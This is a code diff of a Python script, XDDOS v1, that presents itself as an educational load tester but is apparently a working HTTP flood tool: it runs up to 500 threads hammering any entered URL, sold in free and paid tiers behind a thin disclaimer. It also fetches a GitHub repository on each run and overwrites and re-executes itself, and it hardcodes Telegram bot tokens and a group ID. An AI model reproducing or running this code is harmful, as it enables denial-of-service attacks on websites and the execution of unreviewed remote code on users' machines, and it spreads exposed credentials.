@@ -1,325 +1,255 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+"""
+XDDOS v1 - Educational Load Testing Tool
+GitHub: https://github.com/xhacknet/XDDos_v1
+"""
+
 import os
 import sys
-import subprocess
-import tempfile
-import shutil
 import time
 import random
 import string
-import json
 import threading
-from urllib.parse import urlparse
+import subprocess
+import shutil
+import tempfile
+from pathlib import Path
 
-# ============================
-# CONFIGURATION
-# ============================
-REPO_URL = "https://github.com/xhacknet/XDDos_v1.git"      # Your GitHub repo
-VERIFICATION_FILE = os.path.expanduser("~/.ddos_verified")  # Store verification token
-BOT_TOKEN = "8354070661:AAHlEs_J9aZtLlGDknwXcwer8O5C3eXm-zY"  # Your Telegram bot token
-BOT_USERNAME = "@WebLoad_bot"                               # The bot username
-# ============================
-
-# ============================
-# SELF‑UPDATE MECHANISM (with dependency installation)
-# ============================
-def update_and_run():
-    """Clone the latest version, install dependencies, and restart."""
-    # Avoid infinite recursion if we are already in the fresh copy
-    if os.environ.get("DDOS_UPDATED") == "1":
-        return
-
-    temp_dir = tempfile.mkdtemp()
-    try:
-        print("[+] Cloning latest version from GitHub...")
-        subprocess.run(["git", "clone", REPO_URL, temp_dir], check=True, capture_output=True)
-        new_script = os.path.join(temp_dir, "ddos_tool.py")
-        if not os.path.exists(new_script):
-            print("[!] Could not find ddos_tool.py in the cloned repo.")
-            sys.exit(1)
-
-        # Copy verification file if it exists
-        if os.path.exists(VERIFICATION_FILE):
-            shutil.copy(VERIFICATION_FILE, temp_dir)
-
-        # Install required Python modules
-        print("[+] Installing required Python modules...")
-        required_packages = ["rich", "requests", "colorama", "beautifulsoup4", "python-telegram-bot"]
-        # Use pip with --upgrade
-        pip_cmd = [sys.executable, "-m", "pip", "install", "--upgrade"] + required_packages
-        print(f"[DEBUG] Running: {' '.join(pip_cmd)}")
-        result = subprocess.run(pip_cmd, capture_output=False, text=True)
-        if result.returncode != 0:
-            print("[!] pip install failed. Trying with --user...")
-            pip_cmd_user = [sys.executable, "-m", "pip", "install", "--upgrade", "--user"] + required_packages
-            result = subprocess.run(pip_cmd_user, capture_output=False, text=True)
-            if result.returncode != 0:
-                print("[!] Still failed. Please install manually:")
-                print("    pip install rich requests colorama beautifulsoup4 python-telegram-bot")
-                sys.exit(1)
-
-        # Verify rich is importable using the same Python interpreter
-        print("[+] Verifying rich installation...")
-        check_cmd = [sys.executable, "-c", "import rich; print('OK')"]
-        try:
-            subprocess.run(check_cmd, check=True, capture_output=True)
-        except subprocess.CalledProcessError:
-            print("[!] rich still not importable. Exiting.")
-            sys.exit(1)
-
-        # Run the new script with the updated flag
-        print("[+] Starting the latest version...")
-        env = os.environ.copy()
-        env["DDOS_UPDATED"] = "1"
-        subprocess.run([sys.executable, new_script] + sys.argv[1:], env=env)
-        sys.exit(0)
-    except Exception as e:
-        print(f"[!] Update failed: {e}")
-        sys.exit(1)
-    finally:
-        # Clean up temporary directory after a short delay
-        def cleanup():
-            time.sleep(2)
-            shutil.rmtree(temp_dir, ignore_errors=True)
-        threading.Thread(target=cleanup, daemon=True).start()
-
-# Run self‑update (will only do it once)
-update_and_run()
-
-# ============================
-# Now we are in the latest version, safe to import dependencies
-# ============================
-import requests
-from colorama import init, Fore, Style
-from rich.console import Console
-from rich.table import Table
-from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
-from rich.panel import Panel
-from rich import box
+try:
+    import requests
+    from colorama import init, Fore, Style
+except ImportError:
+    print("[!] Missing required modules. Installing...")
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "colorama"])
+    import requests
+    from colorama import init, Fore, Style
 
 init(autoreset=True)
-console = Console()
 
-# ============================
-# TELEGRAM VERIFICATION
-# ============================
-def generate_otp(length=6):
-    return ''.join(random.choices(string.digits, k=length))
+# ========== Configuration ==========
+BOT_TOKEN = "8701118041:AAHGu4HHxAaSYE0GFIxgbnQKBKmw5VJBJMY"
+GROUP_ID = "-1003792290807"
+GITHUB_REPO = "https://github.com/xhacknet/XDDos_v1.git"
+PAID_LINK = "https://www.nxalimrans.site"
+TOOL_LINK = "https://xddosv1.com"
 
-def send_telegram_message(chat_id, text):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": chat_id, "text": text}
+VERIFY_FILE = Path.home() / ".xddos_verified"
+UPDATE_FLAG = Path("/tmp/xddos_update_done")  # avoid update loop
+
+# ========== Helper Functions ==========
+def print_banner():
+    print(Fore.CYAN + Style.BRIGHT + """
+    ╔══════════════════════════════════════╗
+    ║           XDDOS v1 - Load Tester     ║
+    ║      Educational Purpose Only        ║
+    ╚══════════════════════════════════════╝
+    """ + Style.RESET_ALL)
+
+def update_self():
+    """Auto-update: clone/pull latest from GitHub, then restart."""
+    if UPDATE_FLAG.exists():
+        # already updated in this run, skip to avoid loop
+        return
+
+    script_dir = Path(__file__).parent.resolve()
+    repo_dir = script_dir / "XDDos_v1"
+
+    print(Fore.YELLOW + "[*] Checking for updates...")
+
     try:
-        response = requests.post(url, json=payload, timeout=5)
-        return response.status_code == 200
+        # If repo dir exists, pull; otherwise clone
+        if repo_dir.exists():
+            subprocess.run(["git", "-C", str(repo_dir), "pull"], check=True, capture_output=True)
+        else:
+            subprocess.run(["git", "clone", GITHUB_REPO, str(repo_dir)], check=True, capture_output=True)
+
+        # Copy the new script into the current directory (overwrites old)
+        new_script = repo_dir / "xddos.py"
+        current_script = Path(__file__).resolve()
+        if new_script.exists() and new_script != current_script:
+            shutil.copy2(new_script, current_script)
+
+        # Mark update done and restart
+        UPDATE_FLAG.touch()
+        print(Fore.GREEN + "[✓] Updated successfully. Restarting...")
+        os.execv(sys.executable, [sys.executable] + sys.argv)
+    except Exception as e:
+        print(Fore.RED + f"[!] Update failed: {e}")
+        print(Fore.YELLOW + "[*] Continuing with current version...")
+
+def send_telegram_message(text):
+    """Send message to the group using the bot."""
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": GROUP_ID, "text": text, "parse_mode": "HTML"}
+    try:
+        requests.post(url, data=payload, timeout=10)
     except:
-        return False
+        pass
+
+def generate_otp():
+    return ''.join(random.choices(string.digits, k=6))
 
 def verify_user():
-    console.print(Panel.fit("Verification Required", style="cyan"))
-    console.print("1. Open Telegram and start [yellow]{}[/yellow].".format(BOT_USERNAME))
-    console.print("2. Send any message to the bot to get your chat ID.")
-    chat_id = console.input("[?] Your chat ID: ").strip()
+    """OTP verification. Returns True if verified."""
+    if VERIFY_FILE.exists():
+        return True
 
+    print(Fore.YELLOW + "\n[!] First time use requires verification.")
+    print(Fore.CYAN + f"[*] Please join: https://t.me/XHackNet_Group")
+    input(Fore.CYAN + "[*] Press Enter after joining the group...")
+
+    # Generate and send OTP
     otp = generate_otp()
-    if not send_telegram_message(chat_id, f"Your verification code is: {otp}"):
-        console.print("[!] Failed to send OTP. Check your chat ID and bot token.", style="red")
-        return False
+    msg = f"🔐 New user OTP: <code>{otp}</code>\n🕒 Time: {time.ctime()}\n🔗 Tool: {TOOL_LINK}"
+    send_telegram_message(msg)
 
-    user_otp = console.input("[?] Enter the OTP sent to you: ").strip()
-    if user_otp != otp:
-        console.print("[!] Incorrect OTP. Verification failed.", style="red")
-        return False
+    # Ask user to enter OTP
+    attempt = 0
+    while attempt < 3:
+        user_otp = input(Fore.CYAN + "[?] Enter the OTP from the group: ").strip()
+        if user_otp == otp:
+            # Success: create verification file
+            VERIFY_FILE.write_text(time.ctime())
+            print(Fore.GREEN + "[✓] Verified successfully! You won't be asked again.\n")
+            send_telegram_message(f"✅ User verified via OTP {otp} at {time.ctime()}")
+            return True
+        else:
+            attempt += 1
+            print(Fore.RED + f"[!] Wrong OTP. {3 - attempt} attempt(s) left.")
+    print(Fore.RED + "[!] Verification failed. Exiting.")
+    sys.exit(1)
 
-    with open(VERIFICATION_FILE, 'w') as f:
-        json.dump({"chat_id": chat_id, "verified": True}, f)
-    console.print("[✓] Verification successful! You can now use the tool.", style="green")
-    return True
+# ========== Attack Functions ==========
+stop_attack = False
 
-def is_verified():
-    if os.path.exists(VERIFICATION_FILE):
+def attack_worker(url, delay):
+    """Worker thread: sends HTTP GET requests."""
+    global stop_attack
+    while not stop_attack:
         try:
-            with open(VERIFICATION_FILE, 'r') as f:
-                data = json.load(f)
-                return data.get("verified", False)
-        except:
-            pass
-    return False
+            r = requests.get(url, timeout=5)
+            print(Fore.GREEN + f"[+] Request sent | Status: {r.status_code}")
+        except Exception as e:
+            print(Fore.RED + f"[-] Error: {e}")
+        if delay > 0:
+            time.sleep(delay)
 
-# ============================
-# LOAD TESTING WITH REAL‑TIME STATS
-# ============================
-class AttackStats:
-    def __init__(self):
-        self.total = 0
-        self.success = 0
-        self.failed = 0
-        self.lock = threading.Lock()
+def start_attack(url, intensity):
+    """Start attack with given intensity."""
+    global stop_attack
+    stop_attack = False
 
-    def increment(self, success=True):
-        with self.lock:
-            self.total += 1
-            if success:
-                self.success += 1
-            else:
-                self.failed += 1
+    # Define thread count and delay per intensity
+    config = {
+        "1": {"threads": 10, "delay": 0.5, "name": "LOW"},
+        "2": {"threads": 50, "delay": 0.2, "name": "SLOW"},
+        "3": {"threads": 200, "delay": 0.05, "name": "FAST"},
+        "4": {"threads": 500, "delay": 0, "name": "ULTRA FAST"}
+    }
+    conf = config.get(intensity)
+    if not conf:
+        print(Fore.RED + "[!] Invalid intensity choice.")
+        return
 
-    def get(self):
-        with self.lock:
-            return self.total, self.success, self.failed
+    print(Fore.CYAN + f"\n[*] Starting {conf['name']} attack on {url}")
+    print(Fore.YELLOW + "[*] Press Ctrl+C to stop.\n")
 
-def worker(url, rate, duration, stats, stop_event, session):
-    """Worker thread that sends requests at a given rate."""
-    interval = 1.0 / rate
-    end_time = time.time() + duration
-    while not stop_event.is_set() and time.time() < end_time:
-        try:
-            response = session.get(url, timeout=5)
-            if response.status_code < 400:
-                stats.increment(success=True)
-            else:
-                stats.increment(success=False)
-        except Exception:
-            stats.increment(success=False)
-        time.sleep(interval)
-
-def attack(url, rate, duration=60):
-    """Launch a multi‑threaded load test."""
-    if not url.startswith(('http://', 'https://')):
-        url = 'http://' + url
-
-    # Number of threads: up to 10, but at least 1
-    num_threads = max(1, min(10, rate // 10))
-    rate_per_thread = rate / num_threads
-
-    stats = AttackStats()
-    stop_event = threading.Event()
     threads = []
-    sessions = []
-
-    # Create session per thread with connection pooling
-    for _ in range(num_threads):
-        session = requests.Session()
-        adapter = requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=20)
-        session.mount('http://', adapter)
-        session.mount('https://', adapter)
-        sessions.append(session)
-        t = threading.Thread(target=worker,
-                             args=(url, rate_per_thread, duration, stats, stop_event, session))
+    for _ in range(conf["threads"]):
+        t = threading.Thread(target=attack_worker, args=(url, conf["delay"]))
         t.daemon = True
-        threads.append(t)
         t.start()
+        threads.append(t)
 
-    # Live progress display
-    with Progress(
-        SpinnerColumn(),
-        TextColumn("[progress.description]{task.description}"),
-        BarColumn(),
-        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
-        TimeElapsedColumn(),
-        console=console,
-        transient=True
-    ) as progress:
-        task = progress.add_task("[cyan]Attacking...", total=duration)
-        start_time = time.time()
-        while time.time() - start_time < duration and not stop_event.is_set():
-            elapsed = time.time() - start_time
-            progress.update(task, completed=min(elapsed, duration))
-            total, success, failed = stats.get()
-            # Print stats below the progress bar
-            progress.console.print(
-                f"\r[green]Requests: {total}[/green] | "
-                f"[green]Success: {success}[/green] | "
-                f"[red]Failed: {failed}[/red]",
-                end=""
-            )
-            time.sleep(0.5)
-        progress.update(task, completed=duration)
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print(Fore.YELLOW + "\n[!] Stopping attack...")
+        stop_attack = True
+        for t in threads:
+            t.join(timeout=0.5)
+        print(Fore.GREEN + "[✓] Attack stopped.\n")
 
-    # Stop threads
-    stop_event.set()
-    for t in threads:
-        t.join(timeout=1)
-    for s in sessions:
-        s.close()
+# ========== Main Menu ==========
+def free_version():
+    while True:
+        print(Fore.CYAN + Style.BRIGHT + "\n=== FREE VERSION ===\n")
+        print(Fore.CYAN + "1. Start Load Test")
+        print("2. Exit")
+        choice = input(Fore.CYAN + "[?] Select: ").strip()
 
-    total, success, failed = stats.get()
-    console.print(f"\n[green]Attack finished. Total: {total}, Success: {success}, Failed: {failed}[/green]")
+        if choice == "1":
+            url = input(Fore.CYAN + "[?] Enter your website URL (with http:// or https://): ").strip()
+            if not url.startswith(("http://", "https://")):
+                url = "http://" + url
 
-def low_attack(url):
-    console.print("[+] Low load (1 request/second)")
-    attack(url, 1, duration=60)
+            print(Fore.CYAN + "\nSelect Attack Intensity:")
+            print("1. Low Attack   (10 threads, 0.5s delay)")
+            print("2. Slow Attack  (50 threads, 0.2s delay)")
+            print("3. Fast Attack  (200 threads, 0.05s delay)")
+            print("4. Ultra Fast Attack (500 threads, no delay)")
+            intensity = input(Fore.CYAN + "[?] Choose (1-4): ").strip()
+            if intensity in ("1", "2", "3", "4"):
+                start_attack(url, intensity)
+            else:
+                print(Fore.RED + "[!] Invalid choice.")
+        elif choice == "2":
+            print(Fore.GREEN + "[*] Goodbye!")
+            sys.exit(0)
+        else:
+            print(Fore.RED + "[!] Invalid option.")
 
-def slow_attack(url):
-    console.print("[+] Slow load (5 requests/second)")
-    attack(url, 5, duration=60)
-
-def fast_attack(url):
-    console.print("[+] Fast load (20 requests/second)")
-    attack(url, 20, duration=60)
-
-def ultra_attack(url):
-    console.print("[+] Ultra-fast load (100 requests/second)")
-    attack(url, 100, duration=60)
-
-# ============================
-# MAIN MENU (RICH UI)
-# ============================
-def show_menu():
-    table = Table(title="Educational Load Testing Tool", box=box.ROUNDED)
-    table.add_column("Option", style="cyan", justify="center")
-    table.add_column("Attack Type", style="green")
-    table.add_column("Rate", style="yellow")
-    table.add_row("1", "Low Attack", "1 req/s")
-    table.add_row("2", "Slow Attack", "5 req/s")
-    table.add_row("3", "Fast Attack", "20 req/s")
-    table.add_row("4", "Ultra-Fast Attack", "100 req/s")
-    table.add_row("5", "Exit", "")
-    console.print(table)
+def paid_version():
+    print(Fore.YELLOW + "\n[*] Redirecting to paid version...")
+    webbrowser.open(PAID_LINK)  # if webbrowser is available
+    # If webbrowser not available, just print link
+    print(Fore.CYAN + f"Visit: {PAID_LINK}")
 
 def main():
-    # Check verification
-    if not is_verified():
-        if not verify_user():
-            console.print("[red]Verification failed. Exiting.[/red]")
-            sys.exit(1)
-    else:
-        console.print("[green]✓ Already verified. Welcome back![/green]")
+    # Auto-update first
+    update_self()
 
+    print_banner()
+
+    # Disclaimer
+    print(Fore.RED + Style.BRIGHT + """
+    ⚠️  DISCLAIMER ⚠️
+    This tool is for EDUCATIONAL PURPOSES ONLY.
+    You may ONLY test websites you own or have explicit permission to test.
+    Misuse is illegal and unethical.
+    """)
+    confirm = input(Fore.CYAN + "Do you understand and agree? (y/n): ").strip().lower()
+    if confirm != 'y':
+        print(Fore.RED + "[!] Exiting.")
+        sys.exit(0)
+
+    # OTP verification (only once)
+    verify_user()
+
+    # Main choice: free or paid
     while True:
-        show_menu()
-        choice = console.input("[?] Select an option (1-5): ").strip()
-        if choice == '5':
-            console.print("[green]Goodbye![/green]")
-            break
-        if choice not in ['1', '2', '3', '4']:
-            console.print("[red]Invalid choice. Please enter 1-5.[/red]")
-            continue
+        print(Fore.CYAN + Style.BRIGHT + "\n=== MAIN MENU ===")
+        print(Fore.CYAN + "1. Free Version")
+        print("2. Paid Version")
+        print("3. Exit")
+        main_choice = input(Fore.CYAN + "[?] Select: ").strip()
 
-        url = console.input("[?] Enter the URL of your website: ").strip()
-        if not url:
-            console.print("[red]URL cannot be empty.[/red]")
-            continue
-
-        # Confirm educational use
-        console.print("\n[yellow]⚠️  WARNING: This tool is for EDUCATIONAL PURPOSES only.[/yellow]")
-        console.print("Use it ONLY on websites you own or have explicit permission to test.")
-        confirm = console.input("Type 'yes' to proceed: ").strip().lower()
-        if confirm != 'yes':
-            console.print("Aborted.")
-            continue
-
-        # Execute attack
-        if choice == '1':
-            low_attack(url)
-        elif choice == '2':
-            slow_attack(url)
-        elif choice == '3':
-            fast_attack(url)
-        elif choice == '4':
-            ultra_attack(url)
+        if main_choice == "1":
+            free_version()
+        elif main_choice == "2":
+            paid_version()
+        elif main_choice == "3":
+            print(Fore.GREEN + "[*] Goodbye!")
+            sys.exit(0)
+        else:
+            print(Fore.RED + "[!] Invalid option.")
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(Fore.YELLOW + "\n[!] Interrupted. Exiting.")
+        sys.exit(0)
